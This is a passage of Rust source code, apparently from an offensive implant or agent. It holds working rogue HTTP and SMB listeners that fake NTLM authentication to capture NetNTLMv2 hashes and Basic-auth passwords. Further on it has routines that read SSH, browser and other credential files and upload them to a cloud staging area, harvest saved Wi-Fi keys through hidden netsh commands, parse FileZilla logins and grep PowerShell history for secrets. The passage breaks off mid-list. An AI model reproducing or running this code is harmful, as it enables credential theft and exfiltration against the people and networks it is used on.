            let msg_type = u32::from_le_bytes([type1_bytes[8], type1_bytes[9], type1_bytes[10], type1_bytes[11]]);
            if msg_type != 1 { return None; }

            // Step 2: Send 401 + Type2 challenge
            let type2 = _build_ntlmssp_challenge(&challenge);
            let type2_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &type2);
            _http_send_401(stream, Some(&type2_b64))?;

            // Read third request (should have Type3 with hash)
            let req3 = _http_read_request(stream)?;
            let type3_b64 = _http_extract_ntlm(&req3)?;
            let type3_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, type3_b64.trim()).ok()?;

            let hash = _extract_ntlmv2_from_auth(&type3_bytes, &challenge)?;

            // Send 200 OK
            _http_send_200(stream);
            Some(hash)
        }
        Some(token) => {
            // Client sent NTLM auth on first request (Type1 directly)
            let type1_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, token.trim()).ok()?;
            let ntlmssp_sig = sb!("NTLMSSP");
            if !type1_bytes.starts_with(&ntlmssp_sig) { return None; }
            let msg_type = u32::from_le_bytes([type1_bytes[8], type1_bytes[9], type1_bytes[10], type1_bytes[11]]);
            if msg_type != 1 { return None; }

            let type2 = _build_ntlmssp_challenge(&challenge);
            let type2_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &type2);
            _http_send_401(stream, Some(&type2_b64))?;

            let req3 = _http_read_request(stream)?;
            let type3_b64 = _http_extract_ntlm(&req3)?;
            let type3_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, type3_b64.trim()).ok()?;

            let hash = _extract_ntlmv2_from_auth(&type3_bytes, &challenge)?;
            _http_send_200(stream);
            Some(hash)
        }
    }
}

/// Read an HTTP request from the stream. Returns the raw request as a String.
fn _http_read_request(stream: &mut std::net::TcpStream) -> Option<String> {
    use std::io::Read;
    let mut buf = [0u8; 4096];
    let n = stream.read(&mut buf).ok()?;
    if n == 0 { return None; }
    Some(String::from_utf8_lossy(&buf[..n]).to_string())
}

/// Extract the NTLM token from "Authorization: NTLM <base64>" header.
fn _http_extract_ntlm(request: &str) -> Option<String> {
    for line in request.lines() {
        let lower = line.to_lowercase();
        if lower.starts_with("authorization:") {
            let val = line["authorization:".len()..].trim();
            if let Some(token) = val.strip_prefix("NTLM ").or_else(|| val.strip_prefix("ntlm ")) {
                return Some(token.to_string());
            }
        }
    }
    None
}

/// Extract and decode Basic auth credentials. Returns formatted string with peer IP.
fn _http_extract_basic(request: &str, peer: &str) -> Option<String> {
    for line in request.lines() {
        let lower = line.to_lowercase();
        if lower.starts_with("authorization:") {
            let val = line["authorization:".len()..].trim();
            if let Some(token) = val.strip_prefix("Basic ").or_else(|| val.strip_prefix("basic ")) {
                let decoded = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, token.trim()).ok()?;
                let cred_str = String::from_utf8_lossy(&decoded);
                return Some(format!("[HTTP-Basic] {} (from {})", cred_str, peer));
            }
        }
    }
    None
}

/// Send HTTP 401 response. Advertises NTLM (preferred) + Basic as fallback.
fn _http_send_401(stream: &mut std::net::TcpStream, ntlm_token: Option<&str>) -> Option<()> {
    use std::io::Write;
    let ntlm_header = match ntlm_token {
        Some(token) => format!("WWW-Authenticate: NTLM {}\r\n", token),
        None        => "WWW-Authenticate: NTLM\r\n".to_string(),
    };
    let body = "<html><body><h1>401 Unauthorized</h1></body></html>";
    let resp = format!(
        "HTTP/1.1 401 Unauthorized\r\n\
         {}\
         WWW-Authenticate: Basic realm=\"Secured Area\"\r\n\
         Content-Type: text/html\r\n\
         Content-Length: {}\r\n\
         Connection: keep-alive\r\n\
         \r\n\
         {}",
        ntlm_header, body.len(), body
    );
    stream.write_all(resp.as_bytes()).ok()?;
    stream.flush().ok()?;
    Some(())
}

/// Send HTTP 200 OK response.
fn _http_send_200(stream: &mut std::net::TcpStream) {
    use std::io::Write;
    let body = "<html><body><h1>OK</h1></body></html>";
    let resp = format!(
        "HTTP/1.1 200 OK\r\n\
         Content-Type: text/html\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\
         \r\n\
         {}",
        body.len(), body
    );
    let _ = stream.write_all(resp.as_bytes());
}

// ══════════════════════════════════════════════════════════════════════════════
// § SMB LISTENER — minimal SMB2 negotiate + NTLMSSP challenge/response
// ══════════════════════════════════════════════════════════════════════════════

fn _smb_listener_loop(listener: std::net::TcpListener, stop: Arc<std::sync::atomic::AtomicBool>, hashes: Arc<Mutex<Vec<String>>>) {
    use std::io::{Read, Write};
    use std::time::Duration;

    while !stop.load(std::sync::atomic::Ordering::Relaxed) {
        match listener.accept() {
            Ok((mut stream, _addr)) => {
                stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
                stream.set_write_timeout(Some(Duration::from_secs(10))).ok();

                if let Some(hash) = _handle_smb_client(&mut stream) {
                    if let Ok(mut h) = hashes.lock() {
                        if !_is_dup_cred(&h, &hash) {
                            if h.len() >= LISTEN_MAX_HASHES { h.remove(0); }
                            h.push(hash);
                        }
                    }
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                // No connection pending — sleep briefly and retry
                std::thread::sleep(Duration::from_millis(500));
            }
            Err(_) => {
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }
}

/// Handle a single SMB client connection — perform minimal SMB2 negotiate +
/// NTLMSSP challenge-response to capture NetNTLMv2 hash.
fn _handle_smb_client(stream: &mut std::net::TcpStream) -> Option<String> {
    use std::io::{Read, Write};

    let challenge = _random_challenge();
    let mut message_id: u64 = 0;

    // ── Step 1: Read client negotiate ──
    let msg = _smb_read_msg(stream)?;
    if msg.len() < 4 { return None; }

    let is_smb1 = msg[0] == 0xFF && &msg[1..4] == b"SMB";
    let is_smb2 = msg[0] == 0xFE && &msg[1..4] == b"SMB";

    if is_smb1 {
        // Client sent SMB1 negotiate (which includes "SMB 2.???" dialects).
        // Respond directly with an SMB2 Negotiate Response — the client
        // sees \xFESMB and upgrades to SMB2 transparently.
        // This is the multi-protocol negotiation method used by Samba/Responder.
        message_id = 0;
    } else if is_smb2 {
        message_id = _smb2_msg_id(&msg);
    } else {
        return None;
    }

    // ── Step 2: Send SMB2 Negotiate Response (SPNEGO hint, no challenge yet) ──
    let neg_resp = _build_smb2_negotiate_response(message_id);
    _smb_write_msg(stream, &neg_resp)?;

    // ── Step 3: Read Session Setup 1 (NTLMSSP_NEGOTIATE) ──
    let ss1 = _smb_read_msg(stream)?;
    message_id = _smb2_msg_id(&ss1);

    // ── Step 4: Send Session Setup Response (NTLMSSP_CHALLENGE) ──
    let challenge_resp = _build_session_setup_challenge(&challenge, message_id);
    _smb_write_msg(stream, &challenge_resp)?;

    // ── Step 5: Read Session Setup 2 (NTLMSSP_AUTH) — hash is here ──
    let ss2 = _smb_read_msg(stream)?;
    let hash = _extract_ntlmv2_from_auth(&ss2, &challenge)?;

    // ── Step 6: Send STATUS_LOGON_FAILURE ──
    message_id = _smb2_msg_id(&ss2);
    let fail_resp = _build_session_setup_failure(message_id);
    _smb_write_msg(stream, &fail_resp)?;

    Some(hash)
}

// ── SMB2 protocol helpers ────────────────────────────────────────────────────

fn _random_challenge() -> [u8; 8] {
    let mut buf = [0u8; 8];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut buf);
    buf
}

fn _netbios_header(payload_len: usize) -> [u8; 4] {
    let len = payload_len as u32;
    [0x00, (len >> 16) as u8, (len >> 8) as u8, len as u8]
}

fn _smb_read_msg(stream: &mut std::net::TcpStream) -> Option<Vec<u8>> {
    use std::io::Read;
    let mut hdr = [0u8; 4];
    stream.read_exact(&mut hdr).ok()?;
    let len = u32::from_be_bytes([0, hdr[1], hdr[2], hdr[3]]) as usize;
    if len > 65535 { return None; }
    let mut buf = vec![0u8; len];
    stream.read_exact(&mut buf).ok()?;
    Some(buf)
}

fn _smb_write_msg(stream: &mut std::net::TcpStream, data: &[u8]) -> Option<()> {
    use std::io::Write;
    let nb = _netbios_header(data.len());
    stream.write_all(&nb).ok()?;
    stream.write_all(data).ok()?;
    Some(())
}

fn _smb2_msg_id(msg: &[u8]) -> u64 {
    if msg.len() >= 32 {
        u64::from_le_bytes([msg[24], msg[25], msg[26], msg[27],
                            msg[28], msg[29], msg[30], msg[31]])
    } else { 0 }
}

fn _smb2_header(command: u16, status: u32, msg_id: u64, session_id: u64, flags: u32) -> Vec<u8> {
    let mut h = Vec::with_capacity(64);
    h.extend_from_slice(b"\xfeSMB");
    h.extend_from_slice(&64u16.to_le_bytes());     // StructureSize
    h.extend_from_slice(&[0u8; 2]);                 // CreditCharge
    h.extend_from_slice(&status.to_le_bytes());
    h.extend_from_slice(&command.to_le_bytes());
    h.extend_from_slice(&1u16.to_le_bytes());       // CreditsGranted
    h.extend_from_slice(&flags.to_le_bytes());
    h.extend_from_slice(&0u32.to_le_bytes());       // NextCommand
    h.extend_from_slice(&msg_id.to_le_bytes());
    h.extend_from_slice(&0u32.to_le_bytes());       // Reserved
    h.extend_from_slice(&0u32.to_le_bytes());       // TreeId
    h.extend_from_slice(&session_id.to_le_bytes());
    h.extend_from_slice(&[0u8; 16]);                // Signature
    h
}

/// SPNEGO NegTokenInit with NTLMSSP OID — tells client we accept NTLM auth.
fn _build_spnego_init() -> Vec<u8> {
    // Pre-built ASN.1/DER for SPNEGO NegTokenInit listing NTLMSSP (1.2.840.113554.1.2.2.10)
    // This is the exact blob Responder/Samba sends — minimal and Windows-compatible.
    let ntlmssp_oid: &[u8] = &[0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a]; // 1.3.6.1.4.1.311.2.2.10
    let spnego_oid: &[u8] = &[0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02]; // 1.3.6.1.5.5.2

    let mut mech_type = Vec::new();
    mech_type.push(0x06);
    mech_type.push(ntlmssp_oid.len() as u8);
    mech_type.extend_from_slice(ntlmssp_oid);

    let mut mech_types = Vec::new();
    mech_types.push(0x30); // SEQUENCE
    mech_types.push(mech_type.len() as u8);
    mech_types.extend_from_slice(&mech_type);

    let mut mech_list_ctx = Vec::new();
    mech_list_ctx.push(0xa0); // context [0]
    mech_list_ctx.push(mech_types.len() as u8);
    mech_list_ctx.extend_from_slice(&mech_types);

    let mut neg_token_init = Vec::new();
    neg_token_init.push(0x30); // SEQUENCE
    neg_token_init.push(mech_list_ctx.len() as u8);
    neg_token_init.extend_from_slice(&mech_list_ctx);

    let mut neg_token_ctx = Vec::new();
    neg_token_ctx.push(0xa0); // context [0]
    neg_token_ctx.push(neg_token_init.len() as u8);
    neg_token_ctx.extend_from_slice(&neg_token_init);

    let inner_len = spnego_oid.len() + neg_token_ctx.len();
    let mut spnego = Vec::new();
    spnego.push(0x60); // APPLICATION [0]
    if inner_len < 128 {
        spnego.push(inner_len as u8);
    } else {
        spnego.push(0x81);
        spnego.push(inner_len as u8);
    }
    spnego.extend_from_slice(spnego_oid);
    spnego.extend_from_slice(&neg_token_ctx);
    spnego
}

/// SMB2 Negotiate Response — dialect 0x0202 (SMB 2.0.2), SPNEGO security buffer.
fn _build_smb2_negotiate_response(client_msg_id: u64) -> Vec<u8> {
    let sec_buf = _build_spnego_init();
    let mut pkt = _smb2_header(0x0000, 0, client_msg_id, 0, 0x01); // Flags: SERVER_TO_REDIR

    // Negotiate Response body — 65 bytes fixed structure
    let sec_offset: u16 = 128; // 64 (header) + 64 (fixed body before security buffer)
    pkt.extend_from_slice(&65u16.to_le_bytes());      // StructureSize
    pkt.extend_from_slice(&1u16.to_le_bytes());       // SecurityMode: signing enabled
    pkt.extend_from_slice(&0x0202u16.to_le_bytes());  // Dialect: SMB 2.0.2
    pkt.extend_from_slice(&0u16.to_le_bytes());       // NegotiateContextCount (0 for 2.0.2)
    let mut guid = [0u8; 16];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut guid);
    pkt.extend_from_slice(&guid);                     // ServerGUID
    pkt.extend_from_slice(&0u32.to_le_bytes());       // Capabilities
    pkt.extend_from_slice(&65536u32.to_le_bytes());   // MaxTransactSize
    pkt.extend_from_slice(&65536u32.to_le_bytes());   // MaxReadSize
    pkt.extend_from_slice(&65536u32.to_le_bytes());   // MaxWriteSize
    pkt.extend_from_slice(&_windows_filetime().to_le_bytes()); // SystemTime
    pkt.extend_from_slice(&0u64.to_le_bytes());       // ServerStartTime
    pkt.extend_from_slice(&sec_offset.to_le_bytes()); // SecurityBufferOffset
    pkt.extend_from_slice(&(sec_buf.len() as u16).to_le_bytes());
    pkt.extend_from_slice(&0u32.to_le_bytes());       // NegotiateContextOffset

    pkt.extend_from_slice(&sec_buf);
    pkt
}

fn _windows_filetime() -> u64 {
    // 100ns intervals since 1601-01-01 — approximate
    let unix_epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    let secs = unix_epoch.as_secs();
    let nanos100 = unix_epoch.subsec_nanos() as u64 / 100;
    (secs + 11644473600) * 10_000_000 + nanos100
}

/// Build TargetInfo AV_PAIR list for NTLMSSP_CHALLENGE.
fn _build_target_info() -> Vec<u8> {
    let mut info = Vec::with_capacity(128);
    let domain = s!("WORKGROUP");
    let computer = s!("SERVER");

    let domain_utf16: Vec<u8> = domain.encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let computer_utf16: Vec<u8> = computer.encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();

    // MsvAvNbDomainName (0x0002)
    info.extend_from_slice(&2u16.to_le_bytes());
    info.extend_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
    info.extend_from_slice(&domain_utf16);

    // MsvAvNbComputerName (0x0001)
    info.extend_from_slice(&1u16.to_le_bytes());
    info.extend_from_slice(&(computer_utf16.len() as u16).to_le_bytes());
    info.extend_from_slice(&computer_utf16);

    // MsvAvDnsDomainName (0x0004) — required by some Win10+ builds
    info.extend_from_slice(&4u16.to_le_bytes());
    info.extend_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
    info.extend_from_slice(&domain_utf16);

    // MsvAvDnsComputerName (0x0003)
    info.extend_from_slice(&3u16.to_le_bytes());
    info.extend_from_slice(&(computer_utf16.len() as u16).to_le_bytes());
    info.extend_from_slice(&computer_utf16);

    // MsvAvTimestamp (0x0007) — 8 bytes FILETIME
    info.extend_from_slice(&7u16.to_le_bytes());
    info.extend_from_slice(&8u16.to_le_bytes());
    info.extend_from_slice(&_windows_filetime().to_le_bytes());

    // MsvAvEOL (0x0000)
    info.extend_from_slice(&0u16.to_le_bytes());
    info.extend_from_slice(&0u16.to_le_bytes());

    info
}

/// Build Session Setup Response with NTLMSSP_CHALLENGE.
fn _build_session_setup_challenge(challenge: &[u8; 8], msg_id: u64) -> Vec<u8> {
    let ntlm_challenge = _build_ntlmssp_challenge(challenge);
    let spnego = _build_spnego_challenge(&ntlm_challenge);

    let mut pkt = _smb2_header(0x0001, 0xC0000016, msg_id, 1, 0x01); // SESSION_SETUP, MORE_PROCESSING

    let sec_offset: u16 = 72; // 64 (header) + 8 (body fields before padding)
    pkt.extend_from_slice(&9u16.to_le_bytes());   // StructureSize
    pkt.extend_from_slice(&0u16.to_le_bytes());   // SessionFlags
    pkt.extend_from_slice(&sec_offset.to_le_bytes());
    pkt.extend_from_slice(&(spnego.len() as u16).to_le_bytes());

    pkt.extend_from_slice(&spnego);
    pkt
}

/// Wrap NTLMSSP_CHALLENGE in SPNEGO NegTokenResp.
fn _build_spnego_challenge(ntlm_blob: &[u8]) -> Vec<u8> {
    // negState [0] = accept-incomplete (0x01)
    let neg_state: &[u8] = &[0xa0, 0x03, 0x0a, 0x01, 0x01];

    // supportedMech [1] = NTLMSSP OID
    let ntlmssp_oid: &[u8] = &[0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a];
    let mut supported_mech = Vec::new();
    supported_mech.push(0xa1);
    supported_mech.push(ntlmssp_oid.len() as u8);
    supported_mech.extend_from_slice(ntlmssp_oid);

    // responseToken [2] = NTLMSSP blob
    let mut resp_token_inner = Vec::new();
    resp_token_inner.push(0x04); // OCTET STRING
    _asn1_push_len(&mut resp_token_inner, ntlm_blob.len());
    resp_token_inner.extend_from_slice(ntlm_blob);

    let mut resp_token = Vec::new();
    resp_token.push(0xa2); // context [2]
    _asn1_push_len(&mut resp_token, resp_token_inner.len());
    resp_token.extend_from_slice(&resp_token_inner);

    let seq_content_len = neg_state.len() + supported_mech.len() + resp_token.len();
    let mut seq = Vec::new();
    seq.push(0x30); // SEQUENCE
    _asn1_push_len(&mut seq, seq_content_len);
    seq.extend_from_slice(neg_state);
    seq.extend_from_slice(&supported_mech);
    seq.extend_from_slice(&resp_token);

    let mut result = Vec::new();
    result.push(0xa1); // NegTokenResp [1]
    _asn1_push_len(&mut result, seq.len());
    result.extend_from_slice(&seq);
    result
}

fn _asn1_push_len(buf: &mut Vec<u8>, len: usize) {
    if len < 128 {
        buf.push(len as u8);
    } else if len < 256 {
        buf.push(0x81);
        buf.push(len as u8);
    } else {
        buf.push(0x82);
        buf.push((len >> 8) as u8);
        buf.push(len as u8);
    }
}

/// Build NTLMSSP_CHALLENGE message with proper TargetInfo for NTLMv2.
fn _build_ntlmssp_challenge(server_challenge: &[u8; 8]) -> Vec<u8> {
    let target_info = _build_target_info();
    let wg = s!("WORKGROUP");
    let target_name_utf16: Vec<u8> = wg.encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();

    let mut buf = Vec::with_capacity(256);

    let ntlmssp_sig = sb!("NTLMSSP");
    buf.extend_from_slice(&ntlmssp_sig);
    buf.extend_from_slice(&2u32.to_le_bytes()); // Type 2 CHALLENGE

    let target_name_offset: u32 = 48;
    let target_info_offset: u32 = target_name_offset + target_name_utf16.len() as u32;

    // TargetNameFields
    buf.extend_from_slice(&(target_name_utf16.len() as u16).to_le_bytes());
    buf.extend_from_slice(&(target_name_utf16.len() as u16).to_le_bytes());
    buf.extend_from_slice(&target_name_offset.to_le_bytes());

    // Negotiate flags — critical for NTLMv2
    let flags: u32 =
        0x00000001 | // NEGOTIATE_UNICODE
        0x00000002 | // NEGOTIATE_OEM
        0x00000004 | // REQUEST_TARGET
        0x00000010 | // NEGOTIATE_SIGN
        0x00000020 | // NEGOTIATE_SEAL
        0x00000200 | // NEGOTIATE_NTLM
        0x00008000 | // NEGOTIATE_ALWAYS_SIGN
        0x00080000 | // NEGOTIATE_EXTENDED_SESSIONSECURITY (NTLMv2)
        0x00800000 | // NEGOTIATE_TARGET_INFO
        0x20000000 | // NEGOTIATE_128
        0x80000000;  // NEGOTIATE_56
    buf.extend_from_slice(&flags.to_le_bytes());

    buf.extend_from_slice(server_challenge);
    buf.extend_from_slice(&[0u8; 8]); // Reserved

    // TargetInfoFields
    buf.extend_from_slice(&(target_info.len() as u16).to_le_bytes());
    buf.extend_from_slice(&(target_info.len() as u16).to_le_bytes());
    buf.extend_from_slice(&target_info_offset.to_le_bytes());

    // Variable data
    buf.extend_from_slice(&target_name_utf16);
    buf.extend_from_slice(&target_info);

    buf
}

/// Build Session Setup Response with STATUS_LOGON_FAILURE.
fn _build_session_setup_failure(msg_id: u64) -> Vec<u8> {
    let mut pkt = _smb2_header(0x0001, 0xC000006D, msg_id, 1, 0x01);

    pkt.extend_from_slice(&9u16.to_le_bytes());  // StructureSize
    pkt.extend_from_slice(&0u16.to_le_bytes());  // SessionFlags
    pkt.extend_from_slice(&0u16.to_le_bytes());  // SecurityBufferOffset
    pkt.extend_from_slice(&0u16.to_le_bytes());  // SecurityBufferLength
    pkt.push(0); // pad

    pkt
}

/// Extract NetNTLMv2 hash from NTLMSSP_AUTH message in hashcat format.
fn _extract_ntlmv2_from_auth(msg: &[u8], challenge: &[u8; 8]) -> Option<String> {
    // Find NTLMSSP signature in the message
    let ntlmssp_sig = sb!("NTLMSSP");
    let ntlmssp_offset = _find_bytes(msg, &ntlmssp_sig)?;
    let ntlm = &msg[ntlmssp_offset..];

    if ntlm.len() < 88 { return None; }

    // Verify message type = 3 (AUTH)
    let msg_type = u32::from_le_bytes([ntlm[8], ntlm[9], ntlm[10], ntlm[11]]);
    if msg_type != 3 { return None; }

    // Parse fields (each is len:u16, maxlen:u16, offset:u32)
    let _lm_len     = u16::from_le_bytes([ntlm[12], ntlm[13]]) as usize;
    let _lm_offset  = u32::from_le_bytes([ntlm[16], ntlm[17], ntlm[18], ntlm[19]]) as usize;
    let nt_len      = u16::from_le_bytes([ntlm[20], ntlm[21]]) as usize;
    let nt_offset   = u32::from_le_bytes([ntlm[24], ntlm[25], ntlm[26], ntlm[27]]) as usize;
    let domain_len  = u16::from_le_bytes([ntlm[28], ntlm[29]]) as usize;
    let domain_off  = u32::from_le_bytes([ntlm[32], ntlm[33], ntlm[34], ntlm[35]]) as usize;
    let user_len    = u16::from_le_bytes([ntlm[36], ntlm[37]]) as usize;
    let user_off    = u32::from_le_bytes([ntlm[40], ntlm[41], ntlm[42], ntlm[43]]) as usize;

    // Bounds check
    if nt_offset + nt_len > ntlm.len() { return None; }
    if user_off + user_len > ntlm.len() { return None; }
    if domain_off + domain_len > ntlm.len() { return None; }

    // NTLMv2: NT response = 16-byte NTProofStr + variable blob
    if nt_len < 24 { return None; } // Must have at least NTProofStr (16) + some blob

    let nt_response = &ntlm[nt_offset..nt_offset + nt_len];
    let nt_proof_str = &nt_response[..16];
    let nt_blob = &nt_response[16..];

    // Decode UTF-16LE strings
    let username = _utf16le_to_string(&ntlm[user_off..user_off + user_len]);
    let domain = _utf16le_to_string(&ntlm[domain_off..domain_off + domain_len]);

    // Format: user::domain:challenge:NTProofStr:blob
    // hashcat -m 5600 format
    Some(format!("{}::{}:{}:{}:{}",
        username,
        domain,
        hex::encode(challenge),
        hex::encode(nt_proof_str),
        hex::encode(nt_blob),
    ))
}

// ══════════════════════════════════════════════════════════════════════════════
// § INTERNAL HELPERS
// ══════════════════════════════════════════════════════════════════════════════

/// Dedup key for a captured credential. NTLMv2 hashes share user::domain
/// across different challenges, so dedup on that prefix. HTTP-Basic and
/// other formats dedup on the full string.
fn _cred_dedup_key(cred: &str) -> &str {
    if cred.starts_with("[HTTP-Basic]") {
        // "[HTTP-Basic] user:pass (from x.x.x.x)" → dedup on "user:pass"
        return match cred.find(" (from ") {
            Some(pos) => &cred[..pos],
            None => cred,
        };
    }
    // NTLMv2 format: user::domain:challenge:proof:blob — key is user::domain
    match cred.find("::") {
        Some(pos) => match cred[pos + 2..].find(':') {
            Some(end) => &cred[..pos + 2 + end],
            None => cred,
        },
        None => cred,
    }
}

fn _is_dup_cred(existing: &[String], new_cred: &str) -> bool {
    let key = _cred_dedup_key(new_cred);
    existing.iter().any(|c| _cred_dedup_key(c) == key)
}

fn _find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn _utf16le_to_string(data: &[u8]) -> String {
    let chars: Vec<u16> = data.chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&chars)
}

fn _rand_hex(n: usize) -> String {
    let mut buf = vec![0u8; n];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut buf);
    hex::encode(buf)
}

#[cfg(windows)]
fn _reg_extract_value(output: &str) -> Option<String> {
    for line in output.lines() {
        let trimmed = line.trim();
        if trimmed.contains("REG_SZ") || trimmed.contains("REG_DWORD") || trimmed.contains("REG_BINARY") || trimmed.contains("REG_EXPAND_SZ") {
            let parts: Vec<&str> = trimmed.splitn(3, "    ").collect();
            if parts.len() >= 3 {
                return Some(parts[2].trim().to_string());
            }
            if let Some(pos) = trimmed.find("REG_") {
                let after_type = &trimmed[pos..];
                if let Some(space_pos) = after_type.find("    ") {
                    return Some(after_type[space_pos..].trim().to_string());
                }
            }
        }
    }
    None
}

#[cfg(windows)]
fn _vnc_des_decrypt(hex_val: &str) -> String {
    let hex_clean: String = hex_val.chars().filter(|c| c.is_ascii_hexdigit()).collect();
    if hex_clean.is_empty() { return String::new(); }
    // VNC uses DES with known key {e84ad660c4721ae0} (bit-reversed).
    // No DES crate available — return hex for offline decrypt: vncpwd.exe / openssl.
    format!("(DES-encrypted hex: {} — decrypt: echo {} | xxd -r -p | openssl enc -des-ecb -nopad -d -K e84ad660c4721ae0)", hex_clean, hex_clean)
}

fn _fmt_bytes(b: u64) -> String {
    if b < 1024 { format!("{} B", b) }
    else if b < 1024 * 1024 { format!("{:.1} KB", b as f64 / 1024.0) }
    else { format!("{:.1} MB", b as f64 / (1024.0 * 1024.0)) }
}

fn _fmt_duration(d: std::time::Duration) -> String {
    let secs = d.as_secs();
    if secs < 60 { format!("{}s", secs) }
    else if secs < 3600 { format!("{}m {}s", secs / 60, secs % 60) }
    else if secs < 86400 { format!("{}h {}m", secs / 3600, (secs % 3600) / 60) }
    else { format!("{}d {}h", secs / 86400, (secs % 86400) / 3600) }
}

/// Stage a single file to cloud — returns bytes staged or None if not found/readable.
/// `label` is a category prefix (e.g. "ssh", "ff", "chrome"). The displayed filename
/// preserves the original name from disk: `creds_<label>_<original_filename>`.
fn _stage_file(path: &str, label: &str, state: &Arc<AgentState>, transport: &SharedTransport,
               staged: &mut Vec<crate::protocol::StagedFile>) -> Option<u64> {
    let data = std::fs::read(path).ok()?;
    if data.is_empty() { return None; }
    let original = std::path::Path::new(path).file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| label.to_string());
    let fname = format!("creds_{}_{}", label, original);
    let dest = format!("{}/staging/{}_{}",
        state.folder_path.trim_end_matches('/'), fname, _rand_hex(3));
    if transport.upload(&dest, &data) {
        staged.push(crate::protocol::StagedFile {
            cloud_path: dest, filename: fname, source_path: path.to_string(),
        });
        Some(data.len() as u64)
    } else {
        None
    }
}

fn _stage_dir_files(dir: &str, prefix: &str, state: &Arc<AgentState>, transport: &SharedTransport,
                    staged: &mut Vec<crate::protocol::StagedFile>) -> (u32, u64) {
    let mut count = 0u32;
    let mut bytes = 0u64;
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Ok(data) = std::fs::read(&path) {
                    if data.is_empty() { continue; }
                    let name = path.file_name().unwrap_or_default().to_string_lossy();
                    let fname = format!("creds_{}_{}", prefix, name);
                    let dest = format!("{}/staging/creds_{}_{}_{}",
                        state.folder_path.trim_end_matches('/'), prefix, name, _rand_hex(2));
                    if transport.upload(&dest, &data) {
                        let sp = path.display().to_string();
                        staged.push(crate::protocol::StagedFile {
                            cloud_path: dest, filename: fname, source_path: sp,
                        });
                        count += 1;
                        bytes += data.len() as u64;
                    }
                }
            }
        }
    }
    (count, bytes)
}

fn _stage_glob(dir: &str, pattern: &str, prefix: &str, state: &Arc<AgentState>, transport: &SharedTransport,
               staged: &mut Vec<crate::protocol::StagedFile>) -> (u32, u64) {
    let mut count = 0u32;
    let mut bytes = 0u64;
    let glob_pattern = format!("{}/{}", dir, pattern);
    if let Ok(paths) = glob::glob(&glob_pattern) {
        for entry in paths.flatten() {
            if entry.is_file() {
                if let Ok(data) = std::fs::read(&entry) {
                    if data.is_empty() { continue; }
                    let name = entry.file_name().unwrap_or_default().to_string_lossy();
                    let fname = format!("creds_{}_{}", prefix, name);
                    let dest = format!("{}/staging/creds_{}_{}_{}",
                        state.folder_path.trim_end_matches('/'), prefix, name, _rand_hex(2));
                    if transport.upload(&dest, &data) {
                        let sp = entry.display().to_string();
                        staged.push(crate::protocol::StagedFile {
                            cloud_path: dest, filename: fname, source_path: sp,
                        });
                        count += 1;
                        bytes += data.len() as u64;
                    }
                }
            }
        }
    }
    (count, bytes)
}

// ── Platform-specific helpers ────────────────────────────────────────────────

#[cfg(windows)]
fn _get_user_sid() -> Option<String> {
    // Use whoami /user to get the SID
    let output = _hidden_cmd("whoami /user /fo csv /nh").ok()?;
    let out = String::from_utf8_lossy(&output.stdout);
    // Format: "DOMAIN\user","S-1-5-..."
    out.split('"').nth(3).map(|s| s.to_string())
}

#[cfg(windows)]
fn _harvest_wifi_windows() -> String {
    let output = _hidden_cmd("netsh wlan show profiles");
    let profiles_output = match output {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(_) => return String::new(),
    };

    let mut result = String::new();
    for line in profiles_output.lines() {
        if let Some(name) = line.strip_prefix("    All User Profile     : ") {
            let name = name.trim();
            let detail = _hidden_cmd(&format!("netsh wlan show profile name=\"{}\" key=clear", name));
            if let Ok(d) = detail {
                let detail_str = String::from_utf8_lossy(&d.stdout);
                for dl in detail_str.lines() {
                    if dl.contains("Key Content") {
                        let key = dl.split(':').nth(1).unwrap_or("").trim();
                        result.push_str(&format!("    {} → {}\n", name, key));
                        break;
                    }
                }
            }
        }
    }
    result
}



#[cfg(windows)]
fn _parse_filezilla_xml(content: &str) -> String {
    let mut out = String::new();
    let mut host = String::new();
    let mut user = String::new();
    let mut pass = String::new();
    let mut in_server = false;
    for line in content.lines() {
        let l = line.trim();
        if l.starts_with("<Server") { in_server = true; host.clear(); user.clear(); pass.clear(); }
        else if l == "</Server>" || l == "</RecentServer>" {
            if in_server && (!host.is_empty() || !user.is_empty()) {
                out.push_str(&format!("    {}@{} {}\n", user, host,
                    if pass.is_empty() { "(no pass)" } else { "(pass saved)" }));
            }
            in_server = false;
        }
        if in_server {
            if l.starts_with("<Host>") { host = l.replace("<Host>", "").replace("</Host>", ""); }
            if l.starts_with("<User>") { user = l.replace("<User>", "").replace("</User>", ""); }
            if l.starts_with("<Pass") { pass = l.replace("</Pass>", ""); }
        }
    }
    out
}

#[cfg(windows)]
fn _grep_ps_history(content: &str) -> String {
    let patterns = ["password", "secret", "token", "apikey", "api_key",
